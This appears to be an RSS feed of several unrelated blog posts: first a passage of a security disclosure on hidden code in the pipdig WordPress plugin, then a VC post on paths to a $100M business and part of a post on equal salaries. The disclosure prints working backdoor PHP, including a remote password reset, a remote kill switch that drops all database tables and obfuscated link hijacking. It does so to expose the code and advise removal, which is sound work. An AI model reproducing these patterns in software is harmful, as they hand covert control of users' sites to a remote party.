        wp_safe_remote_get($rcd.'&amp;amp;'.rand(0,99999), $args);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Who knows who or what is being spammed by that one.&lt;/p&gt;
&lt;p&gt;Next:&lt;/p&gt;
&lt;h2&gt;pipdig manipulating blogger content for links&lt;/h2&gt;
&lt;p&gt;In /p3/inc/functions.php, line 307 onwards:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;function p3_content_filter($content) {
        if (get_transient('p3_news_new_user_wait')) {
                return $content;
        } elseif (is_single()) {
                $content = str_replace('bloger'.'ize.com', 'pipdig.co/shop/blogger-to-wordpress-m'.'igration/&quot; data-scope=&quot;', $content);
                $content = str_replace('Blog'.'erize', 'Blog'.'ger to WordPress', $content);
        }
        return $content;
}
add_filter('the_content', 'p3_content_filter', 20);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Here we have pipdig’s plugin searching for mentions of ‘&lt;a href=&quot;http://blogerize.com/&quot;&gt;blogerize.com&lt;/a&gt;‘ with the string split in two and rejoined – concatenated – to make it harder to find mentions of competitors when doing a mass ‘Find in Files’ across the plugin (amongst other things). When the plugin finds links to blogerize.com in blogger’s content (posts, pages), they’re swapped out with a link to ‘pipdig.co/shop/blogger-to-wordpress-migration/’ i.e. pipdig’s own blog migration services. Swapping these links out boost the SEO benefit to pipdig, and the vast majority of bloggers wouldn’t notice the switcheroo (especially as if the page/post was edited, the link to blogerize would appear in the backend as normal).&lt;/p&gt;
&lt;h2&gt;pipdig harvesting data &amp;amp; changing admin passwords&lt;/h2&gt;
&lt;p&gt;Back to /p3/inc/cron.php and the Once Hourly job:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$me = get_site_url();
// Check for new social channels to add to navbar etc
if (!get_transient('p3_news_new_user_wait')) {
$url = 'https://pipdigz.co.uk/p3/socialz.txt';
$args = array('timeout' =&amp;gt; 4);
$response = wp_safe_remote_get($url, $args);
if (!is_wp_error($response) &amp;amp;&amp;amp; !empty($response['body'])) {
        if (email_exists(sanitize_email($response['body']))) {
                p3_check_social_links(email_exists(sanitize_email($response['body'])));
                wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode($me), $args);
        }
}
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Here the code comment tells us this piece of code will ‘Check for new social channels to add to navbar etc’. Again, blatant lies. This code performs a GET request on https://pipdigz.co.uk/p3/socialz.txt which is expecting an email address in the response. When an email address is ‘received’ in GET request body, the function checks for the existence of that email address in the Users table, runs its own ‘p3_check_social_links’ function against it and then records the site URL (contained in $me) using a script at https://pipdigz.co.uk/p3/socialz.php.&lt;/p&gt;
&lt;p&gt;p3_check_social_links(), despite its name, is a wrapper for a function in /p3/inc/functions.php line 195 which changes the user password to ‘p3_safe_styles’. In plain English: when the cron runs it checks for an email address in socialz.txt. If that email address exists, it &lt;strong&gt;changes the password&lt;/strong&gt; to that account and logs your URL in socialz.php to allow access to whomever has access to that file. If your admin email address were returned by socialz.txt you would be chucked out of your admin account.&lt;/p&gt;
&lt;p&gt;One blogger argued that this could be used to provide blogger support to pipdig users. While that this is feasibly the case, it’s an entirely unsavoury way of going about it for any of the following reasons:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;It’s a backdoor which can be activated at any time (not just when support is required).&lt;/li&gt;
&lt;li&gt;We don’t know who has access to that data: big corporations can’t keep user passwords secret, why should we trust pipdig?&lt;/li&gt;
&lt;li&gt;There are ways and means to support WordPress users without resetting their password.&lt;/li&gt;
&lt;li&gt;This could easily be hijacked for malicious means&lt;/li&gt;
&lt;li&gt;The password is right there in plain text; I could monitor the socialz.txt file for a response and with a bit of Googling easily find out the corresponding blogs to email addresses and gain access with the insecure password.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Not done yet; a little further down cron.php a function runs to harvest a list of URLs of customers from another competitor, &lt;a href=&quot;https://www.lyricalhost.com/&quot;&gt;lyricalhost.com&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;if (!get_option('p3_check_linkded')) {
        $error_src = parse_url($me, PHP_URL_HOST);
        $dns = dns_get_record($error_src, DNS_NS);
        if ((isset($dns[0]['target']) &amp;amp;&amp;amp; (strpos($dns[0]['target'], 'l'.'yr'.'i'.'calhost'.'.co'.'m') !== false)) || (isset($dns[1]['target']) &amp;amp;&amp;amp; (strpos($dns[1]['target'], 'ly'.'ri'.'calhost'.'.co'.'m') !== false)) ) {
                wp_safe_remote_get('https://pipdigz.co.uk/p3/list.php?list='.rawurldecode($me), $args);
                update_option('p3_check_linkded', 1);
        }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Again, note the concatenation of strings to make it hard to find references to this particular host. Next…&lt;/p&gt;
&lt;h2&gt;pipdig contains a kill switch which wipes blogs&lt;/h2&gt;
&lt;p&gt;And now for the particularly nasty one: in /p3/inc/cron.php we have the following:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
$response = wp_safe_remote_get($url_2, $args);
if (!is_wp_error($response) &amp;amp;&amp;amp; !empty($response['body'])) {
        if ($me === trim($response['body'])) {
                global $wpdb;
                $prefix = str_replace('_', '\_', $wpdb-&amp;gt;prefix);
                $tables = $wpdb-&amp;gt;get_col(&quot;SHOW TABLES LIKE '{$prefix}%'&quot;);
                foreach ($tables as $table) {
                        $wpdb-&amp;gt;query(&quot;DROP TABLE $table&quot;);
                }
        }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This code performs a GET request on ‘https://pipdigz.co.uk/p3/id39dqm3c0.txt’. If it returns a blog URL which matches yours, it looks for all tables with the WordPress prefix and drops them one by one. In other words, if your site is on his kill list, you can kiss goodbye to every post, page, plugin/general settings, widget contents, theme customisations, any form data or miscellaneous content. Bang, gone, goodbye. When was the last time &lt;strong&gt;you&lt;/strong&gt; took a full back-up of your WordPress database?&lt;/p&gt;
&lt;h2&gt;pipdig disabling plugins it deems unnecessary&lt;/h2&gt;
&lt;p&gt;Straight up rude, in /p3/p3.php upon plugin activation the plugin deactivates a whole host of plugins without asking:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$plugins = array(
        'wd-instagram-feed/wd-instagram-feed.php',
        'instagram-slider-widget/instaram_slider.php',
        'categories-images/categories-images.php',
        'mojo-marketplace-wp-plugin/mojo-marketplace.php',
        'mojo-marketplace-hg/mojo-marketplace.php',
        'autoptimize/autoptimize.php',
        'heartbeat-control/heartbeat-control.php',
        'instagram-slider-widget/instaram_slider.php',
        'vafpress-post-formats-ui-develop/vp-post-formats-ui.php',
        'advanced-excerpt/advanced-excerpt.php',
        'force-regenerate-thumbnails/force-regenerate-thumbnails.php',
        'jch-optimize/jch-optimize.php',
        'rss-image-feed/image-rss.php',
        'wpclef/wpclef.php',
        'wptouch/wptouch.php',
        'hello-dolly/hello.php',
        'theme-test-drive/themedrive.php',
);
deactivate_plugins($plugins);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Further down, another bunch are deactivated but this time on admin_init, which would run every time you load a backend panel, making it possible to ever re-enable them while you were running pipdig’s plugin:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// Don't allow some plugins. Sorry not sorry.
function p3_trust_me_you_dont_want_this() {
        $plugins = array(
                'query-strings-remover/query-strings-remover.php', // Stop removing query strings. They're an important part of WP and keeping the site working correctly with caching.
                'remove-query-strings-from-static-resources/remove-query-strings.php',
                'scripts-to-footer/scripts-to-footer.php', // Scripts must also be located in the &lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
so the widgets can render correctly. 'fast-velocity-minify/fvm.php', 'contact-widgets/contact-widgets.php', // Font awesome 5 breaks other icons 'theme-check/theme-check.php', // our themes aren't designed for the w.org repo 'wp-support/index.php' // malware? ); deactivate_plugins($plugins); } add_action('admin_init', 'p3_trust_me_you_dont_want_this');
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;—&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Some of this is ethically questionable behaviour from a major provider of WordPress themes but could &lt;em&gt;maybe&lt;/em&gt; be summarised as “you pay your money, you takes your chances” as is the norm in the WordPress paid eco-system, but I can’t think of a single legitimate reason for DDoSing competitors and running DROP TABLES on random blogs.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;strong&gt;Important note: I wrote this post yesterday, and hung on to it while I sought advice from a third party. Overnight, pipdig released a plugin update removing the relevant code from circulation. I assume his server logs recorded my requests/tests yesterday to the files listed. These problems apply to version 4.7.3 which &lt;a href=&quot;https://www.jemjabella.co.uk/wp-content/uploads/2019/03/p3_v4.7.3.zip&quot;&gt;you can download here&lt;/a&gt; to verify my claims.&lt;/strong&gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Because pipdig is using a third party updater rather than distributing his plugin/themes via WordPress, he could feasibly roll an update out at any time re-implementing the code that’s been removed, and worse. While this is a theoretical risk associated with all providers who sell themes and plugins away from the WordPress theme &amp;amp; plugin directories, I’m not aware of any other provider actively misusing the platform in this way.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;If you’re affected by this, i.e. you have a pipdig theme/plugin, particularly if you’re running version 4.7.3 or earlier of the p3 power pack, I recommend the following steps:&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;Back-up your WordPress files &amp;amp; database&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Activate an alternate theme&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Deactivate and remove the p3 power pack plugin &amp;amp; any supplementary plugins it bundles with&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Check for any users you don’t recognise and remove them&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Reset your admin password(s)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Install &lt;a href=&quot;https://en-gb.wordpress.org/plugins/wp-crontrol/&quot;&gt;WP Crontrol&lt;/a&gt; or similar cron management plugin, and remove any cron jobs named p3_&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Back-up your WordPress files &amp;amp; database &lt;strong&gt;again&lt;/strong&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;code&gt;Alternatively, your host may be able to assist you with moving away from pipdig or removing traces of the code from your server.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;strong&gt;UPDATE 2019-03-29 23:32 GMT: link to Kotryna’s site removed at her request&lt;/strong&gt;&lt;/code&gt;&lt;/p&gt;

<title>Different ways to build a $100M business (2014)</title>
<link>http://christophjanz.blogspot.com/2014/10/five-ways-to-build-100-million-business.html</link>
<guid isPermaLink="true" >http://christophjanz.blogspot.com/2014/10/five-ways-to-build-100-million-business.html</guid>
<description>Some time ago my friend (and co-investor in &lt;a href=&quot;http://www.clio.com/&quot; target=&quot;_blank&quot;&gt;Clio&lt;/a&gt;, &lt;a href=&quot;http://www.getjobber.com/&quot; target=&quot;_blank&quot;&gt;Jobber&lt;/a&gt; and &lt;a href=&quot;http://www.unbounce.com/&quot; target=&quot;_blank&quot;&gt;Unbounce&lt;/a&gt;) &lt;a href=&quot;https://twitter.com/bwertz&quot; target=&quot;_blank&quot;&gt;Boris Wertz&lt;/a&gt; wrote a great blog post about &lt;a href=&quot;http://versiononeventures.com/the-only-2-ways-to-build-a-100-million-business/&quot; target=&quot;_blank&quot;&gt;&quot;the only 2 ways to build a $100 million business&quot;&lt;/a&gt;. I'd like to expand on the topic and suggest that there are &lt;em&gt;five&lt;/em&gt; ways to build a $100 million Internet company. This doesn't mean that I disagree with Boris' article. I think our views are pretty similar, and for the most part &quot;my&quot; five ways are just a slightly different and more granular look at Boris' two ways.&lt;p&gt;The way I look at it can be nicely illustrated in this way:&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-OFzPTTgnDJw/VDG9ts2ixwI/AAAAAAAAAOY/U2nfRq9ltPQ/s1600/5waysto_key.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://4.bp.blogspot.com/-OFzPTTgnDJw/VDG9ts2ixwI/AAAAAAAAAOY/U2nfRq9ltPQ/s1600/5waysto_key.png&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt; &lt;span&gt;The y-axis shows the average revenue per account (ARPA) per year. In the x-axis you can see how many customers you need, for a given ARPA, to get to $100 million in annual revenues. Both axes use a logarithmic scale.&lt;/span&gt;&lt;br/&gt;&lt;div&gt;

&lt;div&gt;&lt;br/&gt;To build a Web company with $100 million in annual revenues*, you essentially need:&lt;ul&gt;&lt;li&gt;1,000 enterprise customers paying you $100k+ per year each; or&lt;/li&gt;
&lt;li&gt;10,000 medium-sized companies paying you $10k+ per year each; or&lt;/li&gt;
&lt;li&gt;100,000 small businesses paying you $1k+ per year each; or&lt;/li&gt;
&lt;li&gt;1 million consumers or &quot;prosumers&quot; paying you $100+ per year each (or, in the case of eCommerce businesses, 1M customers generating $100+ in contribution margin** per year each); or&lt;/li&gt;
&lt;li&gt;10 million active consumers who you monetize at $10+ per year each by selling ads&lt;/li&gt;
&lt;/ul&gt;&lt;div&gt;&lt;br/&gt;Salespeople sometimes refer to &quot;elephants&quot;, &quot;deers&quot; and &quot;rabbits&quot; when they talk about the first three categories of customers. To extend the metaphor to the 4th and 5th type of customer, let's call them &quot;mice&quot; and &quot;flies&quot;. So how can you hunt 1,000 elephants, 10,000 deers, 100,000 rabbits, 1,000,000 mice or 10,000,000 flies? Let's take a look at it in reverse order.&lt;p&gt;&lt;strong&gt;Hunting flies&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;In order to get to 10 million active users you need roughly 100 million people who download your app or use your website. This is of course a gross simplification, and the precise number depends on various factors like your conversion rate, how active your users are, churn, etc. But it doesn't change the take-away: To get to $100 million in ad revenues, you need dozens of millions of users. I know of only two ways to achieve that (plus one mega-outlier which breaks all rules, Google). The first one is to have a product that is inherently social and has a high viral coefficient (Instagram, Snapchat, WhatsApp). The second one is a ton of UGC (user-generated content), which leads to large amounts of SEO traffic and some level of virality. Good examples of this second option include Yelp or our portfolio company &lt;a href=&quot;http://www.brainly.com/&quot; target=&quot;_blank&quot;&gt;Brainly&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Hunting mice&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;To acquire one million consumers or prosumers who pay you roughly $100 per year, you need to get at least 10-20 million people to try your application. This is – again – a gross simplification, but I believe it's order-of-magnitude correct. To get to 10-20 million users you almost certainly need some level of virality, too – maybe not Snapchat-like virality, but some social sharing or &quot;powered by&quot;-virality. Great examples of this category include Evernote and MailChimp. If you're an eCommerce business you might be able to acquire one million customers using paid marketing, but it requires huge amounts of funding.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Hunting rabbits&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Most SaaS companies that target small businesses charge something around $50-100 per month, so their ARPA per year is around $1k. To acquire 100,000 of these businesses you need something in the order of 0.5-2 million trial signups, depending on your conversion rate. Let's assume that your CLTV (customer lifetime value) is $2,700 (assuming an average customer lifetime of three years and a gross margin of 90%) and that you want your CLTV to be 4x your CACs (customer acquisition costs). In that case you can spend $675 to acquire a customer. If your signup-to-paying conversion rate is 10% that means you can spend $67.50 per signup (assuming a no-touch sales model where your CACs can go entirely into lead generation).&lt;/p&gt;&lt;p&gt;So how can you get one million signups for less than $70 each? Most SaaS products aren't inherently viral, there usually isn't enough inventory to make paid advertising work at scale, and cold calling usually doesn't work at this ARPA level. There's no silver bullet, but the closest thing to a silver bullet is inbound marketing – besides having a fantastic product with a very high NPS (net promoter score) and being obsessively focused on funnel optimization. I've written about this in more detail in my &quot;DOs for SaaS startups&quot; series: &lt;a href=&quot;http://christophjanz.blogspot.de/2012/11/the-3rd-do-for-saas-startups-create.html&quot; target=&quot;_blank&quot;&gt;Create an awesome product&lt;/a&gt;, &lt;a href=&quot;http://christophjanz.blogspot.de/2012/12/the-4th-do-for-saas-startups-make-your.html&quot; target=&quot;_blank&quot;&gt;Make your website your best marketing person&lt;/a&gt;, &lt;a href=&quot;http://christophjanz.blogspot.de/2013/03/the-6th-do-for-saas-startups-fill-funnel.html&quot; target=&quot;_blank&quot;&gt;Fill the funnel&lt;/a&gt;, &lt;a href=&quot;http://christophjanz.blogspot.de/2013/09/the-7th-do-for-saas-startups-build.html&quot; target=&quot;_blank&quot;&gt;Build a repeatable sales process&lt;/a&gt;. Another option is a an OEM strategy (i.e. getting your product distributed by big partners), which can work but comes with its own challenges.&lt;/p&gt;&lt;p&gt;Interestingly, hunting rabbits looks much less straightforward than hunting flies or hunting elephants. Why we have a strong focus on rabbit hunting SaaS companies nonetheless is something for another post.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Hunting deers&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;If you're a deer hunter and want to acquire 10,000 customers paying you $10k per year each, most of the rabbit hunting tactics still apply. An ARPA of $10k per year usually isn't enough to make traditional enterprise field sales work, and you likely still have to get 100,000 or more leads. The main difference is that when you're hunting deers you can use an inside sales force to close leads, potentially also to generate leads. It also means that you can pay VARs and channel partners an attractive commission, although I've rarely seen this work in SaaS.&lt;/p&gt;&lt;p&gt;SaaS companies sometimes start as rabbit hunters and expand into deer hunting over time. This can work very well and we're very excited about these types of businesses, but to successfully execute this strategy, SaaS founders with a product/tech/marketing DNA usually have to bring in an experienced VP of Sales who has built an inside sales organization before.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Hunting elephants&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Like it or not, most of the biggest SaaS companies derive most of their revenues from selling expensive subscriptions to large enterprises. Workday, Veeva, SuccessFactors, Salesforce.com, you name it. &lt;a href=&quot;https://twitter.com/jasonlk&quot; target=&quot;_blank&quot;&gt;Jason M. Lemkin&lt;/a&gt;, another friend and co-investor, once said (I'm quoting from memory) that if you have a good solution for a significant problem experienced by large enterprises, building a $100 million business is relatively straightforward. After all, you only need 1,000 customers, and the $100k you need from each of them is less than they spend on the salary of one executive. I think there's a lot of truth in that.&lt;/p&gt;&lt;p&gt;The other part of the truth, though, is that it may take you several years and millions of dollars to find out if you really are solving a problem (a.k.a. product/market fit), and once you're at that point, you still need tens of millions of dollars or more to finance the enterprise sales cycle. This does not at all mean that elephant hunting isn't attractive. It just requires very different skills, which usually means a founder team with enterprise sales DNA.&lt;/p&gt;&lt;p&gt;That leaves me with the million dollar – sorry, one &lt;em&gt;hundred&lt;/em&gt; million dollar – question: Which other ways to build a $100 million business are there that I've overlooked? Let me know!&lt;/p&gt;&lt;p&gt;[Update: I've posted a follow-up post, &lt;a href=&quot;http://christophjanz.blogspot.de/2014/11/three-more-ways-to-build-100-million.html&quot; target=&quot;_blank&quot;&gt;&quot;Three more ways to build a $100 million business&quot;&lt;/a&gt;.]&lt;/p&gt;&lt;p&gt;[Another update: &lt;a href=&quot;https://medium.com/point-nine-news/5-ways-to-build-a-100-million-business-c5066181bf50#.vqpnx8lbl&quot; target=&quot;_blank&quot;&gt;Here's an infographic version of this post.&lt;/a&gt;]&lt;/p&gt;&lt;p&gt;[Yet another update: &lt;a href=&quot;http://christophjanz.blogspot.com/2017/02/5-ways-100-million-dollars-100-free.html&quot;&gt;We turned the post into a poster!&lt;/a&gt;]&lt;/p&gt;&lt;p&gt;___________________________________&lt;/p&gt;&lt;p&gt;&lt;span&gt;* If you have $100 million in annual high-margin revenue, you will likely be able to exit for $500 million to $1 billion or more. That's the kind of exit most venture capitalists are looking for, although we as a small fund can achieve a great fund performance with somewhat lower outcomes. &lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt; &lt;span&gt;** For eCommerce companies, which naturally have a much lower contribution margin than purely digital businesses like SaaS and are therefore valued at much lower revenue multiples, it makes more sense to target $100M in contribution margin.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;

<title>The one-salary experiment, ten years in</title>
<link>https://iwantmyname.com/blog/the-one-salary-experiment-ten-years-in</link>
<guid isPermaLink="true" >https://iwantmyname.com/blog/the-one-salary-experiment-ten-years-in</guid>
<description>&lt;p class=&quot;post-text&quot;&gt;&lt;img class=&quot;post-image&quot; src=&quot;https://images.iwantmyname.com/blog/electricity-experiement.jpg&quot; alt=&quot;picture of a person experimenting with electricity&quot;/&gt;&lt;/p&gt;&lt;p class=&quot;post-text&quot;&gt;Five years ago, &lt;a class=&quot;post-link&quot; href=&quot;https://iwantmyname.com/blog/2014/05/culture-at-iwmn-part-one&quot;&gt;Lenz (one of our co-founders) wrote&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;41&quot;&gt;
&lt;p&gt;At iwantmyname everyone earns the same. This sounds strange to many and I get asked a lot of questions how this may work once we grow bigger and the honest answer is: “I don’t know, but so far it works” and I give that same answer since we started 5 years ago.&lt;/p&gt;
&lt;p&gt;The underlying idea has two main roots. First, we really think that everyone is as important to the success of our team as anyone else in the team. We don’t believe in a hierarchy or in more important people. If we hire you, we think you are valuable and want you to be part of our team as a level peer, not an underlying that does the stuff no one else wants to do.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;post-text&quot;&gt;Soon after, it hit the Hacker News front page, and the &lt;a class=&quot;post-link&quot; href=&quot;https://news.ycombinator.com/item?id=7713996&quot;&gt;top comment&lt;/a&gt; went as follows (from a person called fishtoaster):&lt;/p&gt;
&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;39&quot;&gt;
&lt;p&gt;That’s a cool experiment. It’s always neat to see people trying new, weird ways to run a company.&lt;/p&gt;
&lt;p&gt;That said, I would predict the following:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;As the company grows, they have trouble hiring specialists or more senior people, since they’re competing with other companies for those people, but without the flexibility to offer a comparable salary. They could solve this by paying their highest-paid person what they’re worth, and everyone else the same, but that could be prohibitively expensive.&lt;/li&gt;
&lt;li&gt;The need will develop for people who, though valuable, are plentiful (e.g., a janitor, but fill in any role here that’s generally near the bottom of the pay scale). The decision will be “We’d really like a janitor, but not enough to pay $X”, where X is their everyone-salary (which has to be high enough to attract their most valuable people). As such, they’ll be hard-pressed to hire roles that aren’t really worth that much to them.&lt;/li&gt;
&lt;li&gt;Of course, you can solve either of those by having more money than you know what to do with. So, if they’re wildly profitable, it’s a system that’ll keep working.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;That’s just my prediction, though. I’d love to see a followup blog post in a few years describing how it went.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;post-text&quot;&gt;Well, fishtoaster… this one’s for you.&lt;/p&gt;
&lt;h2&gt;Market rate&lt;/h2&gt;
&lt;p class=&quot;post-text&quot;&gt;One thing that happened over the last 5-10 years is that people’s idea of what “market rate” is for a remote developer job seems to be shifting to the market rate of San Francisco. And that’s a tough place to play if you A. don’t have beaucoup VC money, B. aren’t sitting on a pile of disposable cash.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;For instance, according to &lt;a class=&quot;post-link&quot; href=&quot;https://www.payscale.com/research/NZ/Job=Software_Developer/Salary/79165fa1/Wellington&quot;&gt;PayScale&lt;/a&gt;, the average software developer in Wellington NZ makes NZ$64k. We pay more than that, but when you become a remote company, people start looking for the $134k USD salary people are making in the top 10% of SF (which seems a bit low to me, but I’ll take their word for it). In one beautiful locale we pay in the top 10%, and in the other, we’re pretty meh.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;So when fishtoaster says,&lt;/p&gt;
&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;33&quot;&gt;
&lt;p&gt;The decision will be “We’d really like a janitor, but not enough to pay $X”, where X is their everyone-salary (which has to be high enough to attract their most valuable people).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;post-text&quot;&gt;… I feel that. It’s a legitimate concern. Basically, we’re playing a game where the success of the company hinges on our ability to hire good developers, but we can’t offer top SF rates without shrinking our staff because our operating costs would be too high due to our flat structure. Fortunately for us, we’re competing not only on salary, but freedom, and that shouldn’t be taken lightly.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;For as much as we hear about greed and people doing anything for money, the truth is that the world is large and full of people with different motivations. We’ve had people in emerging economies mention top-10% SF rates, but we’ve also had people in the more expensive parts of EU work for less because of the lifestyle we can somewhat uniquely offer. For example, I could probably make more in a management role elsewhere, but at iwantmyname, I get to pick my kids up from school every day without fail. To me, that’s worth a whole lot, but to someone else, it might mean very little. We’re all motivated by very different things.&lt;/p&gt;
&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;34&quot;&gt;
&lt;p&gt;I’m sure certain individuals are paid somewhat below market value while others are paid handsomely for their role. This can hurt when hiring employees in the former category. The flat hierarchy, general job benefits, and culture need to make up for the market pay-cut.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;post-text&quot;&gt;(Random quotes are from a team poll I did about our one-salary structure. You’ll see them sprinkled throughout.)&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;For us, everything has mostly worked out — we offer a certain amount, have had little trouble filling job openings, and our turnover is low (and to my knowledge, no one who has ever left did it primarily because of our pay structure). That said, I do feel the pressure of getting us closer to SF-senior-dev competitive wages because recruitment will inevitably get harder if the pay gap becomes too wide. We’ll never be able to pay the top-end salary of a Fortune 500 company under our current structure unless we stumble our way into a mind-blowing new market segment, but we &lt;em&gt;can&lt;/em&gt; pull ourselves closer without making non-dev positions unreasonably expensive.&lt;/p&gt;
&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;39&quot;&gt;
&lt;p&gt;To be able to hire and retain good staff, the amount also needs to be focused on the high end of what’s needed to be competitive. What may be a good salary for support or marketing or whatever &lt;em&gt;elsewhere&lt;/em&gt; may be quite low for good development talent, for example, and people are rarely, or only to a very limited degree, willing to accept a pay cut because they like a company’s culture or the projects they’ll be doing, etc.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Motivation and turnover&lt;/h2&gt;
&lt;p class=&quot;post-text&quot;&gt;Turnover is a tricky thing to talk about because it feels like weakness, but it’s impossible to avoid when running a business. And it’s important to know that all companies are working from a different baseline. In a previous life, I worked at an ad agency that somewhat purposefully churned through recent college grads to maximize staff ROI (turns out, cheap labor being client-billed for ~$150/hr is a good way for owners to get rich). That world is different than this world though — clients came and went, onboarding was basically instant because each project was from scratch, and the work was more about immediate impact than retaining institutional knowledge. Turnover there was like watching the seasons change. So it went.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;In a small tech shop like iwantmyname though, institutional knowledge is everything because nearly nothing is built from the ground up. And onboarding is relatively painful because we don’t have people we can just dedicate to training. Turnover sucks, so we do our best to avoid it. And I think we’ve done a pretty good job. Here’s what our “stats” look like:&lt;/p&gt;
&lt;ul class=&quot;post-unordered-list&quot;&gt;&lt;li class=&quot;post-list-item&quot;&gt;20 total employees&lt;/li&gt;
&lt;li class=&quot;post-list-item&quot;&gt;all but four are still involved with the company&lt;/li&gt;
&lt;li class=&quot;post-list-item&quot;&gt;all four that left were developers&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;post-text&quot;&gt;As I said before, overall retention is good… much better than at any job I’ve had in the past. But while the sample size is small, there &lt;em&gt;is&lt;/em&gt; a relationship between market rate and turnover. While we have 100% retention for non-developers, our typical dev window is roughly three years (again, small sample size… compounded by the fact that iwantmyname basically didn’t do any hiring for the first five years).&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;Here’s the thing though. Even in Silicon Valley, where salaries are extremely high across the board and employees are showered in benefits, tech &lt;a class=&quot;post-link&quot; href=&quot;https://www.businessinsider.com/average-employee-tenure-retention-at-top-tech-companies-2018-4#tesla-is-in-the-same-league-with-employees-staying-at-the-electric-car-maker-21-years-on-average-tesla-employees-work-famously-long-hours-and-weekends-which-could-explain-the-relatively-early-burnout-3&quot;&gt;retention is low&lt;/a&gt;. I don’t think income is the primary motivator here (although I’m sure it helps with recruiting).&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;My general theory is that people are motivated by two things in life: pain avoidance and happiness. No matter what you do, you’re always trying to find the thing that brings the most happiness with the least amount of pain. Some people find higher peak happiness through suffering, and some people are hedonists who work to experience minimal pain, but both are operating under the same framework.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;So what we’re looking at here is a dev vs non-dev marketplace of employees. Every individual is different, but most people find happiness at work through money and perks (remote work, working on stuff you like, freedom to make decisions, etc.). The tangle is that in this market, non-devs tend to experience pain while looking for jobs, while even mediocre devs routinely get contacted by recruiters offering ++ salaries and signing bonuses. There’s no friction for a developer, and without friction, there’s no pain. So as soon as things lose their shine, stats show that developers tend to move on. And it’s understandable — why stagnate when there are endless opportunities to do new and interesting things?&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;From a management perspective, all I can do is optimize the things I can control to reduce pain. Here are the three things I focus on:&lt;/p&gt;
&lt;ol class=&quot;post-ordered-list&quot;&gt;&lt;li class=&quot;post-list-item&quot;&gt;&lt;strong&gt;Freedom&lt;/strong&gt;. The worst part of being in a traditional office is seeing how fast your calendar gets booked. Endless meetings, pointless team-building activities, random reporting reminders to make middle managers happy. Some of it is useful, but I do my very best to clear up people’s schedules so they can maximize their time not working. To me, the ideal workplace is one that lets me enjoy my own life… not one that tries to merge with it.&lt;/li&gt;
